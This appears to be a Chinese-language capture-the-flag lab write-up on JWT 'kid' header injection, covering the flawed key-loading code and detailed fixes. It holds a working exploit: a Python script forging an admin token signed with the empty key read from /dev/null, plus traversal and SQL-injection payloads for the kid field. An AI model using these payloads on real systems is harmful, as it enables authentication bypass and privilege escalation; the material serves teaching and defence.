# JWT 的 kid 头注入

## 这一题在教什么

**安全决策的参数，不该由被验证的对象自己提供。**

这一题跟 `jwt/alg_none` 是同一个道理的两个面：

| | 参数从哪来 | 攻击者怎么利用 |
|---|---|---|
| `jwt/alg_none` | 验签**算法**从 token 自己声明的 `alg` 里读 | 声明 `alg: none`，签名就免了 |
| 这一题 | 验签**密钥**从 token 自己声明的 `kid` 里推 | 让 `kid` 指向一个内容已知的文件 |

共同点一句话：**验证方决定怎么验，不是被验证方。**

## 漏洞在哪

`module.py`：

```python
def load_key(kid):
    path = os.path.join(KEY_DIR, kid)     # ← kid 直接当路径用
    with open(path, "rb") as handle:
        return handle.read()
```

`kid` 来自 token 的头部，而 token 完全由客户端控制。

配套的目录结构：

```
keys/
  rotate-2026.key      ← 当前活跃的密钥（内容是真随机，猜不到）
  rotate-2025.key      ← 轮换时留下的旧密钥（真实环境里很常见）
```

设计本身是合理的（多密钥轮换真实系统都这么干）。坑在**实现**上：
`kid` 是**路径**，不是**标识符**。

## 怎么打通

### 第一步：看清 token

登录之后页面上给出 token 原文。拆成三段分别 base64url 解码，头部是：

```json
{"alg": "HS256", "typ": "JWT", "kid": "rotate-2026.key"}
```

`kid` 就是"用哪把密钥"。

### 第二步：确认它是被当路径用的

把 `kid` 改成一个不存在的名字，报错会说：

```
kid 指向的密钥读不到：不存在.key
```

—— 说明它在**读文件**。

### 第三步：找一个内容已知的文件当密钥

最经典的是 `/dev/null` —— 读出来**永远是空字节串**。

```
kid = "/dev/null"
```

于是服务端用**空密钥**验签。而空密钥攻击者是知道的，所以他可以签出任意内容。

### 第四步：用空密钥签一个 `role=admin` 的 token

```python
import base64, hashlib, hmac, json

def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}
payload = {"user": "alice", "role": "admin"}

head = b64e(json.dumps(header, separators=(",", ":")).encode())
body = b64e(json.dumps(payload, separators=(",", ":")).encode())
mac = hmac.new(b"", ("%s.%s" % (head, body)).encode(), hashlib.sha256).digest()
print("%s.%s.%s" % (head, body, b64e(mac)))
```

### 第五步：调接口

```bash
curl -H 'Authorization: Bearer <token>' '<接口地址>'
```

拿到 admin 数据就通关了。

## 还能读哪些文件当密钥

关键是"**内容已知**"：

| 目标 | 说明 |
|---|---|
| `/dev/null` | **内容恒为空** —— 最省事，密钥就是 `b""` |
| `keys/rotate-2025.key` | 旧密钥如果内容泄露过（或者很弱）—— 轮换时旧密钥常常没删 |
| 一个你能写进去的文件 | 有上传功能、有日志（日志内容你能控制一部分）的话 |
| `/proc/self/environ` | 内容猜不到，但能泄露环境变量（换个思路用） |
| `../../../etc/hostname` | 主机名常常是默认值（可猜） |
| `.` 或空串 | 读到目录 → 读失败 → 但报错会告诉你路径 |

最后一条也值得注意：**报错本身就是信息**。
"读不到 xxx" 这种回显让你能把目录结构试出来。

## 其他 `kid` 相关的变体

| 变体 | 说明 |
|---|---|
| `kid` 进 SQL | `SELECT key FROM keys WHERE kid='<kid>'` → **SQL 注入**，用 `' UNION SELECT 'mykey' --` 把密钥换成自己知道的 |
| `kid` 可枚举 | `/keys/1`、`/keys/2`…… 挨个试，总有一把弱的 |
| `kid` 指向可上传的文件 | 自己写一把密钥进去 |
| `kid` 是相对路径没规范化 | `../../../../dev/null`（这一题绝对路径就行，因为 `os.path.join` 遇到绝对路径会丢弃前面的部分） |

## 怎么修

**一、`kid` 先过白名单，再查表。**

```python
KEY_DIR = Path("keys").resolve()
KEYS = {
    "rotate-2026.key": b"...",
    "rotate-2025.key": b"...",
}

def load_key(kid):
    # 一、类型和形状先卡住
    if not isinstance(kid, str) or not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", kid):
        return None
    # 二、只认表里有的 —— 这是白名单，不是"检查路径"
    return KEYS.get(kid)
```

**不要**在这一层做"路径规范化 + 边界检查"。那是第二道防线，
而这里的正确方向是"**根本不让 `kid` 决定读什么**"。

**二、更根本的：`kid` 应该只是"标识"，不是"定位"。**

```python
# 服务端自己知道当前该用哪把 —— kid 只是一个标签，用来对账/轮换
key = CURRENT_KEY
if header.get("kid") != CURRENT_KID:
    abort(401, "token 是用旧密钥签的，请重新登录")
```

这样即使攻击者乱填 `kid`，服务端也不会去读任何东西。

**三、密钥不要存在"能按路径取"的地方。**

放在环境变量、KMS、或者代码里都行。**不要放在"文件系统某个目录里、按名字取"** ——
那本身就是把"密钥选择"变成了"文件读取"。

**四、轮换时把旧密钥彻底删掉。**

这一题特意留了 `rotate-2025.key` 就是想说明：
"轮换"做完之后旧密钥还在，等于多留了一把钥匙在地上。

**五、验签之前，把所有"由 token 决定的参数"列出来审一遍。**

一张清单：

| 参数 | 由 token 决定？ | 安全吗 |
|---|---|---|
| `alg` | 是 | **不行** —— 只允许你配置的那一种 |
| `kid` | 是 | **不行** —— 至少不能当路径 |
| `jku` / `jwk` | 是 | **不行** —— 那是让 token 指定"去哪拿公钥"，等于自己给自己发证书 |
| `x5u` | 是 | 同上 |
| `typ` | 是 | 一般无害 |

`jku` / `jwk` / `x5u` 这几个头值得单独记住 —— 它们跟 `kid` 是同一类问题的
更严重版本：**让 token 自己指定公钥的来路**。

## 顺手想想

- 如果 `load_key` 里加了 `os.path.basename(kid)`，这一题还能打吗？
  （想清楚 basename 挡住了什么、没挡住什么）
- 如果密钥目录里所有文件的内容都是 32 字节的随机串，
  `/dev/null` 这条路被堵上了，还有别的路吗？
  （提示：`kid` 能不能指向 `/proc/self/...` 下面某个内容可控的文件）
- 为什么说 `jku` 比 `kid` 更危险？
- 这一题的服务端"用 kid 查文件"，如果换成"用 kid 查数据库"，
  会变成哪一类漏洞？（提示：去看 `sqli/*`）
